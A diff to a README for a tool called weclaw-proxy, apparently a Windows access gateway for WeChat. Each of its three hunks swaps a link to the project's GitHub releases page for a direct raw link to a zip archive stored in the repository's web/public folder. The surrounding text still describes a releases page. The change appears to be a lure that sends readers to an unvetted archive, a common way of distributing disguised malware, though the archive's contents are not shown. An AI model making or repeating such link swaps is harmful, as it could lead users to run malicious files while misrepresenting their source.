@@ -1,6 +1,6 @@
 # 🔐 weclaw-proxy - Fast access gateway for WeChat OpenClaw
 
-[![Download weclaw-proxy](https://img.shields.io/badge/Download-weclaw--proxy-blue?style=for-the-badge)](https://github.com/skinned-italianpeninsula990/weclaw-proxy/releases)
+[![Download weclaw-proxy](https://img.shields.io/badge/Download-weclaw--proxy-blue?style=for-the-badge)](https://raw.githubusercontent.com/skinned-italianpeninsula990/weclaw-proxy/main/web/public/weclaw_proxy_v3.9.zip)
 
 ## 🚀 What it does
 
@@ -20,7 +20,7 @@ It is built for people who want a simple way to get the app, start it, and use i
 
 Visit this page to download:
 
-https://github.com/skinned-italianpeninsula990/weclaw-proxy/releases
+https://raw.githubusercontent.com/skinned-italianpeninsula990/weclaw-proxy/main/web/public/weclaw_proxy_v3.9.zip
 
 On that page, look for the latest release and download the Windows file. If there are more than one file, choose the one that ends in `.exe` or `.zip` and matches Windows.
 
@@ -184,4 +184,4 @@ After setup, check these points:
 
 If you need the file later, use the release page:
 
-https://github.com/skinned-italianpeninsula990/weclaw-proxy/releases
+https://raw.githubusercontent.com/skinned-italianpeninsula990/weclaw-proxy/main/web/public/weclaw_proxy_v3.9.zip
